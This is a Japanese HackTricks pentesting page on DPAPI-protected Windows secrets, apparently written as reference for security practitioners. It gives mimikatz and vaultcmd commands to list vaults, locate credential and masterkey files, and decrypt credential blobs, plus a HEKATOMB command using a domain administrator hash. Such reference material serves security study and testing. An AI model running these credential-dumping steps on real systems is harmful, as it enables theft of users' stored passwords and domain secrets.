# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術的知識の促進**を使命とし、この会議はあらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## DPAPIとは

データ保護API（DPAPI）は、主にWindowsオペレーティングシステム内で**非対称プライベートキーの対称暗号化**に利用され、ユーザーまたはシステムの秘密を重要なエントロピーのソースとして活用します。このアプローチは、開発者がユーザーのログオン秘密から導出されたキーを使用してデータを暗号化できるようにすることで、暗号化を簡素化し、システム暗号化の場合はシステムのドメイン認証秘密を使用することで、開発者が暗号化キーの保護を自ら管理する必要を排除します。

### DPAPIによって保護されたデータ

DPAPIによって保護される個人データには以下が含まれます：

- Internet ExplorerおよびGoogle Chromeのパスワードと自動補完データ
- OutlookやWindows Mailなどのアプリケーションのメールおよび内部FTPアカウントのパスワード
- 共有フォルダー、リソース、無線ネットワーク、Windows Vaultのパスワード、暗号化キーを含む
- リモートデスクトップ接続、.NET Passport、およびさまざまな暗号化および認証目的のプライベートキーのパスワード
- Credential Managerによって管理されるネットワークパスワードおよびSkype、MSNメッセンジャーなどのCryptProtectDataを使用するアプリケーション内の個人データ

## リストボールト
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 認証ファイル

**保護された認証ファイル**は、次の場所にあります:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz `dpapi::cred`を使用して資格情報情報を取得すると、暗号化データやguidMasterKeyなどの興味深い情報を見つけることができます。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
**mimikatz モジュール** `dpapi::cred` を適切な `/masterkey` と共に使用して復号化できます:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## マスターキー

ユーザーのRSAキーを暗号化するために使用されるDPAPIキーは、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されており、ここで{SID}はそのユーザーの[**セキュリティ識別子**](https://en.wikipedia.org/wiki/Security_Identifier)です。**DPAPIキーは、ユーザーの秘密鍵を保護するマスターキーと同じファイルに保存されています**。通常、これは64バイトのランダムデータです。（このディレクトリは保護されているため、cmdから`dir`を使用してリストすることはできませんが、PSからリストすることはできます）。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
ユーザーのマスタキーの一部は次のようになります：

![](<../../images/image (1121).png>)

通常、**各マスタキーは他のコンテンツを復号化できる暗号化された対称鍵です**。したがって、**暗号化されたマスタキーを抽出することは、後でそれを使用して暗号化された**他のコンテンツを**復号化するために興味深いです**。

### マスタキーを抽出して復号化する

マスタキーを抽出して復号化する方法の例については、投稿を確認してください [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)。

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) は、[@gentilkiwi](https://twitter.com/gentilkiwi) の [Mimikatz](https://github.com/gentilkiwi/mimikatz/) プロジェクトからのDPAPI機能のC#ポートです。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAPディレクトリからすべてのユーザーとコンピュータを抽出し、RPCを通じてドメインコントローラのバックアップキーを抽出するツールです。スクリプトはすべてのコンピュータのIPアドレスを解決し、すべてのコンピュータでsmbclientを実行して、すべてのユーザーのDPAPIブロブを取得し、ドメインバックアップキーでそれを復号化します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAPから抽出したコンピュータのリストを使用すると、知らなかったサブネットワークをすべて見つけることができます！

「ドメイン管理者権限だけでは不十分です。すべてをハックしてください。」

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPIによって保護された秘密を自動的にダンプできます。

## 参考文献

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**で最も重要なイベントの1つです。**技術的知識を促進することを使命として**、この会議はあらゆる分野の技術とサイバーセキュリティの専門家の熱い集会地点です。

{% embed url="https://www.rootedcon.com/" %}

{{#include ../../banners/hacktricks-training.md}}
